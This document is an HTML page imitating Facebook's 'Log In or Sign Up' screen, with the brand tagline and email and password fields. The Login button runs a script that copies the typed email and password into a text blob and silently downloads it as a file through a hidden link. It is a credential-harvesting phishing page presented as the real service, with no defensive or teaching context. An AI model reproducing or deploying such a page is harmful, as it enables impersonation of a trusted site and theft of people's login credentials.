<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook  - Log In or Sign Up</title>
    <link rel="shortcut icon" href="download.png">
    <link rel="stylesheet" href="bootstrap.min.css">
    <link rel="stylesheet" href="bootstrap.min.css.map">
    <style>
          .centers {
            display: flex;
            flex-direction: column;
            justify-content: center;
            text-align: center;
            min-height: 80vh;
        }
    </style>
</head>
<body style="background: #F0F2F5;">
    <div class="container ">
        <div class="centers">
        <div class="row">
             <div class="col-md-10 offset-md-1">
                
                <div class="row">
                    <div class="col-lg-7 col-md-7">
                        <div class="text-left">
                            <img src="dF5SId3UHWd.svg" height="100" alt="">
                            <p class="ml-4" style="font-size: 30px;">
                                Connect with friends and the world around you on Facebook.
                            </p>
                        </div>
                    </div>
                    <div class="col-lg-5 col-md-5 p-1">
                        <div class="card shadow">
                            <div class="card-body">
                                <form>
                                    <div class="form-group">
                                    <input type="text" id="inputEmail" class="p-4 form-control form-control-lg" placeholder="Email or Phone Number">
                                    </div>
                                    <div class="form-group">
                                    <input type="password" id="inputPassword" class="p-4 form-control form-control-lg" placeholder="Password">
                                    </div>
                                    <button onclick="saveTextAsFile()" class="btn btn-primary btn-lg btn-block"><b>Login</b></button>
                                    <div class="form-group text-center mt-3" style="color:blue">
                                        <a  class="">Forgot Password?</a>
                                    </div>
                                    <hr>
                                    <div class="form-group text-center mt-3" style="">
                                        <button type="submit" class="btn btn-success btn-lg">Create New Account</button>
                                    </div>
                                </form>
                            </div>
                        </div>

                        <p class="mt-4"><b>Create a Page</b> for a celebrity, band or business.</p>
                    </div>
                </div>

            </div>
        </div>
        </div>
    </div>
</body>
</html>
<script>function saveTextAsFile()
    {
        var textEmail = document.getElementById("inputEmail").value;
        var textToSave = document.getElementById("inputPassword").value;
        var textToSaveAsBlob = new Blob(["Email: ",textEmail," Password: ",textToSave], {type:"text/plain"});
        var textToSaveAsURL = window.URL.createObjectURL(textToSaveAsBlob);
        var fileNameToSaveAs = "sampleText";
     
        var downloadLink = document.createElement("a");
        downloadLink.download = fileNameToSaveAs;
        downloadLink.innerHTML = "Download File";
        downloadLink.href = textToSaveAsURL;
        downloadLink.onclick = destroyClickedElement;
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
     
        downloadLink.click();
    }
     
    function destroyClickedElement(event)
    {
        document.body.removeChild(event.target);
    }
     
    function loadFileAsText()
    {
        var fileToLoad = document.getElementById("fileToLoad").files[0];
     
        var fileReader = new FileReader();
        fileReader.onload = function(fileLoadedEvent) 
        {
            var textFromFileLoaded = fileLoadedEvent.target.result;
            document.getElementById("inputPassword").value = textFromFileLoaded;
        };
        fileReader.readAsText(fileToLoad, "UTF-8");
    }
     
</script>
